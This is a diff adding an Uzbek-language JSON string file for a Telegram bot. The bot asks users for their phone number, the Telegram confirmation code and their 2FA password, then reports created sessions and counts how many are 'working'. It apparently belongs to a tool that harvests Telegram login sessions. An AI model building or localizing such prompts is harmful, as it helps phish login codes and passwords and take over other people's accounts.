@@ -1,0 +1,17 @@
+{
+    "start": "Assalomu alaykum! Iltimos, telefon raqamingizni yuboring (masalan, +998901234567). Yoki /help buyrug'ini ishlating.",
+    "phone_check": "Telefon raqamingiz qabul qilindi: {}. Iltimos, Telegramdan kelgan tasdiqlash kodini yuboring.",
+    "code_error": "Tasdiqlash kodi noto'g'ri. Iltimos, qaytadan urinib ko'ring.",
+    "code_success": "Tasdiqlash muvaffaqiyatli amalga oshirildi. Session yaratildi.",
+    "back": "Orqaga",
+    "sql_error": "Session {} boshlanmadi.",
+    "2fe_password": "Iltimos, akkauntingiz uchun 2FA parolini kiriting.",
+    "checking_password": "Parolni tekshirish...",
+    "password_error": "Parol noto'g'ri. Iltimos, qaytadan urinib ko'ring.",
+    "2fa_success": "2FA parol to'g'ri. Session yaratildi.",
+    "help_text": "Buyruqlar:\n\n/start - Botni ishga tushirish\n/help - Ushbu xabarni ko'rsatish\n/count - Sizning sessionlar soni\n/check_on_work - Sizning sessionlar ishda yoki yo'qmi",
+    "count_text": "Siz {} ta session yaratdingiz.",
+    "error_text": "Xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.",
+    "no_sessions": "Sizda hech qanday sessionlar yo'q.",
+    "check_on_work_text": "Sessionlar soni: {}\n🔋Ishlayapti: {}\n🪫Ishlamayapti: {}"
+}
